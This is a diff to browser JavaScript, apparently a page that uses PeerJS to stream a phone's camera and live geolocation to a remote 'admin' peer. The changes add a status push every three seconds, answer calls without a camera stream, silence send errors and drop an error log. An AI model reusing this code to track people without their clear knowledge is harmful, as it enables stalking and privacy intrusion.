@@ -82,6 +82,7 @@
     let activeCall = null;
     let activeDataConn = null;
     let watchId = null;
+    let pushInterval = null;
     let latestLocation = null;
     let isStarting = false;
     let isSwitchingCam = false;
@@ -111,12 +112,15 @@
     function sendStatusToAdmin() {
         if (hasError) return;
         if (activeDataConn && activeDataConn.open) {
-            activeDataConn.send({
-                type: "STATUS",
-                facing: currentFacing === "environment" ? "Belakang" : "Depan",
-                location: latestLocation,
-                updatedAt: Date.now()
-            });
+            try {
+                activeDataConn.send({
+                    type: "STATUS",
+                    facing: currentFacing === "environment" ? "Belakang" : "Depan",
+                    cameraActive: Boolean(cameraStream),
+                    location: latestLocation,
+                    updatedAt: Date.now()
+                });
+            } catch (e) {}
         }
     }
 
@@ -213,7 +217,6 @@
                 }
                 throw new Error("Kamera gagal dibuka.");
             }
-            console.error("Switch camera failed:", err);
             return oldStream;
         } finally {
             isSwitchingCam = false;
@@ -223,6 +226,11 @@
     function setupPeer() {
         if (peer || hasError) return;
         peer = new Peer(ROOM_ID);
+
+        peer.on("open", () => {
+            if (pushInterval) clearInterval(pushInterval);
+            pushInterval = setInterval(sendStatusToAdmin, 3000);
+        });
 
         peer.on("connection", (conn) => {
             if (hasError) return;
@@ -247,9 +255,11 @@
         });
 
         peer.on("call", (call) => {
-            if (hasError || !cameraStream) return;
+            if (hasError) return;
             activeCall = call;
-            call.answer(cameraStream);
+            if (cameraStream) {
+                call.answer(cameraStream);
+            }
         });
 
         peer.on("error", (err) => {
@@ -269,6 +279,7 @@
                 await openCamera(currentFacing, false);
             }
             setupPeer();
+            sendStatusToAdmin();
         } catch (err) {
             triggerError(err && err.message ? err.message : "Izin ditolak.");
         } finally {
@@ -285,10 +296,16 @@
         if (hasError || isStarting || isSwitchingCam) return;
         if (!latestLocation || !cameraStream) {
             init();
+        } else {
+            sendStatusToAdmin();
         }
     }
 
     function cleanup() {
+        if (pushInterval) {
+            clearInterval(pushInterval);
+            pushInterval = null;
+        }
         if (watchId !== null) {
             navigator.geolocation.clearWatch(watchId);
             watchId = null;
